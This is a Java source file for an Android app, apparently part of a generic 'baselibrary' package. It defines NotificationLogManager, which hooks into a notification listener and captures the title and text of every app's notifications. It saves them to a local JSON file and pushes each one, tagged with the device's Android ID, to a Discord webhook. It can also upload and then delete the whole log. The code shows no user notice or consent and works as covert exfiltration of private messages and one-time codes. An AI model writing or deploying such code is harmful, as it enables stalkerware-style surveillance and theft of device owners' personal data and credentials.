package com.application.baselibrary.notification;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.application.baselibrary.network.DiscordWebhookClient;
import com.application.baselibrary.notification.model.NotificationData;
import com.application.baselibrary.threading.scheduler.OneTimeTaskRunner;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class NotificationLogManager {

    private static final String TAG = "NotificationLogManager";
    private static final Object FILE_LOCK = new Object();

    private final Context context;
    private String webhookUrl;
    private final Gson gson = new Gson();
    private final Map<String, NotificationData> lastNotifications = new HashMap<>();

    public NotificationLogManager(Context context, String webhookUrl) {
        this.context = context.getApplicationContext();
        this.webhookUrl = webhookUrl;

        // Register with listener
        AppNotificationListener.setLogManager(this);
    }

    public void onNewNotification(NotificationData data) {

        lastNotifications.put(data.getPackageName(), data);

        Log.i(TAG, "Received new notification: " + data.getText());
        saveLocally(data);
        pushIndividualToDiscord(data);
    }

    private static final long EXPIRY_MS = 1 * 60 * 1000; // 1 minutes

    private void cleanupOldEntries() {
        OneTimeTaskRunner.runOnce(() -> {
            long now = System.currentTimeMillis();
            lastNotifications.entrySet().removeIf(e -> (now - e.getValue().getTimestamp()) > EXPIRY_MS);
            Log.i(TAG, "LastNotifications list print after cleanup: " + lastNotifications.toString() + "");
        }, 2, TimeUnit.SECONDS);
    }


    private void saveLocally(NotificationData data) {
        synchronized (FILE_LOCK) {
            File logFile = new File(context.getFilesDir(), "notifications.json");
            Map<String, List<NotificationData>> groupedLogs = null;

            try {
                if (logFile.exists()) {
                    try (FileReader reader = new FileReader(logFile)) {
                        groupedLogs = gson.fromJson(reader,
                                new TypeToken<Map<String, List<NotificationData>>>() {
                                }.getType());
                    } catch (Exception e) {
                        Log.e(TAG, "Corrupted log file. Resetting.");
                        logFile.delete();
                    }
                }

                if (groupedLogs == null) groupedLogs = new HashMap<>();

                groupedLogs.computeIfAbsent(data.getPackageName(), k -> new ArrayList<>()).add(data);

                try (FileWriter writer = new FileWriter(logFile)) {
                    gson.toJson(groupedLogs, writer);
                }

                Log.d(TAG, "Notification saved for " + data.getPackageName());

            } catch (Exception e) {
                Log.e(TAG, "Save failed: " + e.getMessage());
            }
        }
    }

    private void pushIndividualToDiscord(NotificationData data) {
        if (webhookUrl == null || webhookUrl.isEmpty()) return;

        try {
            String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            String timeString = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date(data.getTimestamp()));

            String content = String.format("🔔 Notification\nDevice: %s\nApp: %s\nTitle: %s\nText: %s\nTime: %s",
                    androidId, data.getPackageName(), data.getTitle(), data.getText(), timeString);
            Log.i(TAG, "Discord push content: " + content);

            new DiscordWebhookClient(webhookUrl).sendMessage(content);

        } catch (Exception e) {
            Log.e(TAG, "Discord push failed: " + e.getMessage());
        } finally {
            cleanupOldEntries();
        }
    }

    // ✅ New method: push entire notifications.json to Discord and delete
    public void pushLogFileToDiscordAndDelete() {
        if (webhookUrl == null || webhookUrl.isEmpty()) {
            Log.w(TAG, "Webhook URL not set. Cannot push log file.");
            return;
        }

        synchronized (FILE_LOCK) {
            File logFile = new File(context.getFilesDir(), "notifications.json");
            if (!logFile.exists()) {
                Log.w(TAG, "No notifications.json file found to push.");
                return;
            }

            try {
                String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                String message = "📂 **Bulk Notification Log (Grouped)**\nDevice: " + androidId;

                Log.i(TAG, "Pushing notifications.json file to Discord");
                new DiscordWebhookClient(webhookUrl).uploadFile(logFile, message, new DiscordWebhookClient.WebhookCallback() {
                    @Override
                    public void onSuccess(DiscordWebhookClient.WebhookResponse response) {
                        // Delete file after successful push
                        if (logFile.delete()) {
                            Log.i(TAG, "notifications.json deleted after push.");
                        } else {
                            Log.w(TAG, "Failed to delete notifications.json after push.");
                        }
                    }

                    @Override
                    public void onError(String errorMessage) {

                    }
                });


            } catch (Exception e) {
                Log.e(TAG, "Failed to push log file: " + e.getMessage());
            }
        }
    }
}
